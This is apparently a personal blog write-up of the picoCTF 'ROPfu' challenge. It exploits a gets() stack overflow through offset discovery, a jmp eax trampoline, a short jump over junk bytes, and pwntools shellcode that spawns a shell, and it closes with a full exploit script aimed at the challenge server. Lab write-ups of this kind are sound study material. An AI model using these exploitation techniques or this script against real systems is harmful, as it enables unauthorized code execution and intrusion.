---
title: "Ropfu"
date: 2025-10-21T22:45:55+05:30
draft: False
---


When I first cracked open the source for **ROPfu**, I was greeted with almost nothing. The binary was basically a single `gets()` call. That’s already a giant red flag: `gets()` is one of the classic unsafe functions in C, and here it’s basically handing us a buffer overflow on a silver platter.


## Step 1: Finding the Offset

Since the binary didn’t have any helper functions to directly leak `flag.txt`, the plan was clear: exploit the overflow and craft our own control flow.

Using **gdb-gef**, I generated a cyclic pattern with:

```
pattern create 200
```

and then after crashing the program, I used:

```
pattern offset $eip
```

This gave me an offset of **28**. Perfect—now I know exactly how many bytes it takes to overwrite EIP.


## Step 2: Scouting for Gadgets

The binary had no direct `system()` or file-read helper functions, so I needed to rely on Return-Oriented Programming (ROP). Using **ROPgadget**, I searched for jumps into registers:

```
ROPgadget --binary vuln | grep "jmp e"
```

The output was:

```asm
0x0805333b : jmp eax
0x080567f2 : jmp ebp
0x08061205 : jmp ebx
0x0804f63e : jmp ecx
0x0804a893 : jmp edi
0x08049bcc : jmp edx
0x080a6270 : jmp esi
```

Noticeably, nothing to directly pivot into `esp`. But the `jmp eax` stood out as the perfect *trampoline* because of the 32-bit calling conventions. The payload was already getting pushed to the `eax`. So if I could control `eax`, I could redirect execution into my own shellcode living on the stack.


## Step 3: First Payload Test

I built a simple test payload to confirm control:

```python
b"A"*28 + pwn.p32(0x0805333b) + b"C"*100
```

Here, `0x0805333b` is the `jmp eax`.

Inside **gdb**, I set a breakpoint at `0x0805333b` and stepped through execution. What I saw was interesting:

```asm
0xffffcd08    inc    ecx
0xffffcd09    inc    ecx
0xffffcd0a    inc    ecx
0xffffcd0b    inc    ecx   ; opcode of "inc ecx" = b"A"

0xffffcd0c    cmp    esi, DWORD PTR [ebx]
0xffffcd0e    add    eax, 0x43434308 ; junk instruction from our payload

0xffffcd13    inc    ebx
0xffffcd14    inc    ebx
0xffffcd15    inc    ebx   ; opcode of "inc ebx" = b"C"
```

So what happened? The injected address (`0x0805333b`) itself got treated as part of the shellcode, leading to corrupted flow. Essentially, junk bytes were messing with execution.


## Step 4: Skipping the Junk

The fix was simple but clever: insert a **short jump** to skip over the junk bytes. A quick search told me that `EB 08` represents a `jmp +8`.

To confirm in pwntools:

```python
>>> print(pwn.disasm(b"\xeb\x08"))
0:   eb 08     jmp    0xa
```

Perfect. So I shaved off 2 bytes of padding and slipped the short jump before the trampoline.

Payload now looked like this:

```python
b"A"*26 + b"\xeb\x08" + pwn.p32(0x0805333b) + b"C"*100
```

This way, when execution reaches our buffer, the short jump (`\xeb\x08`) skips over the junk and lands neatly into our controlled space.


## Step 5: Shellcode & Final Exploit

With execution flow stable, it was time to drop in actual shellcode. Pwntools makes this easy with its built-in Linux shell generator:

```python
pwn.shellcraft.i386.linux.sh()
```

Final exploit script:

```python
import pwn

rop_gadget = pwn.p32(0x0805333b)   # jmp eax
jmp_over_ins = b'\xeb\x08'         # short jump +8
shellcode = pwn.asm(pwn.shellcraft.i386.linux.sh())

payload = b"".join([
        b"\x90"*26,       # NOP sled
        jmp_over_ins, 
        rop_gadget,
        shellcode
    ])

with open("payload", "wb") as f:
    f.write(payload)

p = pwn.remote('saturn.picoctf.net', 53441)
p.sendline(payload)
p.interactive()
```




